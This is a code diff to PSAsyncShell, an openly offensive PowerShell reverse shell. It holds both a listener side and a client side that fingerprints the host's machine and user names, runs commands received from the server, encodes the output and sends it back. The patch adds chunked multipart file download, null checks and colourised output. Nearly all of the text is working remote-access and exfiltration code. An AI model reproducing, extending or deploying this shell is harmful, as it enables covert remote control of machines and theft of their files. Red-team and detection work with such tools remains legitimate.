@@ -1,7 +1,7 @@
-﻿#================================#
-#   PSAsyncShell by @JoelGMSec   #
-#      https://darkbyte.net      #
-#================================#
+﻿#==============================#
+#  PSAsyncShell by @JoelGMSec  #
+#     https://darkbyte.net     #
+#==============================#
 
 # Design
 Set-StrictMode -Off
@@ -136,33 +136,39 @@ $data = $reader.ReadLine()
 if ($Start -eq "True") { $path = R64Decoder -t $data ; $Start = "False"
 $data = $null ; if ($path -like "*\*") { $remoteslash = "\" } else { $remoteslash = "/" }}
 
-elseif ($download -eq "True") { R64Decoder -f $data $downfile
-$data = "[+] File downloaded on $pwd$localslash$downfile!`n" ; $download = "False" }
+elseif ($download -eq "True") {
+if ($(R64Decoder -t $data) -eq "[+] Sending MultiPart Data..") { $data = $null
+Write-Host "[+] Receiving MultiPart Data" -ForegroundColor Yellow -NoNewline
+$Multi = "True" ; $download = "False" ; $MultiDown = "True" }
+else { R64Decoder -f $data $downfile
+$data = "[+] File downloaded on $pwd$localslash$downfile!`n" ; $download = "False" }}
 
 elseif ($Multi -eq "True") { if ($(R64Decoder -t $data) -eq "[+] MultiPart Data OK!") { 
-$Multi = "False" ; $data = R64Decoder -t $multidata ; $multidata = $null ; Write-Host "`n" }
+if ($MultiDown -eq "True") { $Multi = "False" ; $data = R64Decoder -f $multidata $downfile ; $MultiDown = "False"
+$data = "[+] File downloaded on $pwd$localslash$downfile!`n" ; $multidata = $null ; Write-Host "`n" }
+else { $Multi = "False" ; $data = R64Decoder -t $multidata ; $multidata = $null ; Write-Host "`n" }}
 else { $multidata += $data ; $data = $null ; Write-Host "." -ForegroundColor Yellow -NoNewline }}
 
-else { $data = R64Decoder -t $data }
+else { if ($data -ne $null) { $data = R64Decoder -t $data }}
 
 if (!$data) { if ($Multi -eq "False") { Write-Host }}
 if ($data -eq "[+] Ready to upload!") { $data = $null }
 if ($data -eq "[+] File uploaded!") { $data = "[+] File uploaded on $path$remoteslash$upfile!`n" }
 if ($data -eq "[+] Sending MultiPart Data..") { $data = $null ; $Multi = "True"
 Write-Host "[+] Receiving MultiPart Data" -ForegroundColor Yellow -NoNewline }
-if ($data) { Write-Host $data -ForegroundColor Yellow }
 
+if ($data -like '*[+]*') { Write-Host $data -ForegroundColor Green }
+else { if ($data) { Write-Host $data -ForegroundColor Yellow }}
 $client.Close() ; $Listener.Stop()}}
 
 # ------------ Client Side ------------ #
+if ($args[0] -like "-c") { while ($true) { $cmd = $null ; $out = $null
 $ClientData = New-Object -TypeName psobject
 $ClientData | Add-Member -MemberType NoteProperty -Name Current -Value "*"
 $RandomID = (-join ((0x30..0x39)+(0x41..0x5A)+(0x61..0x7A) | Get-Random -Count 12  | % {[char]$_}))
 $ClientData | Add-Member -MemberType NoteProperty -Name ClientID -Value $RandomID
 $ClientData | Add-Member -MemberType NoteProperty -Name ComputerName -Value $([System.Environment]::MachineName.tolower())
 $ClientData | Add-Member -MemberType NoteProperty -Name UserName -Value $([System.Environment]::UserName.tolower())
-
-if ($args[0] -like "-c") { while ($true) { $cmd = $null ; $out = $null
 
 # Read command from server
 Start-Sleep -milliseconds 500
@@ -195,7 +201,7 @@ elseif ($Multi -eq "True") { GetChunk $multiout | % { Start-Sleep -milliseconds 
 elseif ($Multi -eq "SendOut") { $out = R64Encoder -t "[+] MultiPart Data OK!" ; $Multi = "False" ; $multiout = $null }
 else { $out = $(sh "$cmd") | Out-String
 if ($args -like "*-debug") { Write-Host "OUT: $out" }
-$out = R64Encoder -t $out }
+if ($out -ne $null) { $out = R64Encoder -t $out }}
 
 if ($Chunk) { if ($out.length -ge $Chunk) { $multiout = $out ; $Multi = "True"
 $out = R64Encoder -t "[+] Sending MultiPart Data.." }}
